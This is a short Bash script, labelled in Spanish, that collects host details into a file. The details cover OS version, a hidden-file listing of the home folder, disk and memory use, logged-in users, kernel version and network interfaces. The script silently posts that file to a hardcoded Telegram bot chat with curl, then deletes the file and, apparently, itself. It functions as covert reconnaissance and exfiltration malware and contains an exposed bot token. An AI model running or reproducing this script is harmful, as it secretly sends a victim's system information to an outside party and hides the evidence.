#!/bin/bash

clear

rm -rf r.txt
echo -e "- - - - - - - - Nombre completo sistema - - - - - - - - "> r.txt
echo >> r.txt
lsb_release -idc >> r.txt
echo >> r.txt
echo -e "- - - - - - - - Archivos ocultos de home - - - - - - - - " >> r.txt
echo >> r.txt
ls -la >> r.txt
echo >> r.txt
echo -e "- - - - - - - - Espacio disco - - - - - - - - " >> r.txt
echo >> r.txt
df >> r.txt
echo >> r.txt
echo -e "- - - - - - - - Uptime - - - - - - - - " >> r.txt
echo >> r.txt
uptime >> r.txt
echo >> r.txt
echo -e "- - - - - - - - Usuarios conectados - - - - - - - - " >> r.txt
echo >> r.txt
w >> r.txt
echo >> r.txt
echo -e "- - - - - - - - Carpeta actual - - - - - - - - " >> r.txt
echo >> r.txt
pwd >> r.txt
echo >> r.txt
echo -e "- - - - - - - - Arquitectura - - - - - - - - " >> r.txt
echo >> r.txt
arch >> r.txt
echo >> r.txt
echo -e "- - - - - - - - Kernel usado - - - - - - - - " >> r.txt
echo >> r.txt
uname -r >> r.txt
echo >> r.txt
echo -e "- - - - - - - - Version kernel linux - - - - - - - - " >> r.txt
echo >> r.txt
cat /proc/version >> r.txt
echo >> r.txt
echo -e "- - - - - - - - Memoria usada - - - - - - - - " >> r.txt
echo >> r.txt
free >> r.txt
echo >> r.txt
echo -e "- - - - - - - - Interfaces de red - - - - - - - - " >> r.txt
echo >> r.txt
cat /proc/net/dev >> r.txt
echo >> r.txt
echo -e "- - - - - - - - Hora - - - - - - - - " >> r.txt
echo >> r.txt
date >> r.txt
echo >> r.txt

curl -s -X  POST "https://api.telegram.org/bot5412577382:AAEnTFP6bkRHb5Ok2g8mF6YUuVFT75uo_ws/sendDocument" -F chat_id="-1001753394166" -F document="@r.txt" > /dev/null 2>&1

rm -rf r.txt
rm -rf rr.sh
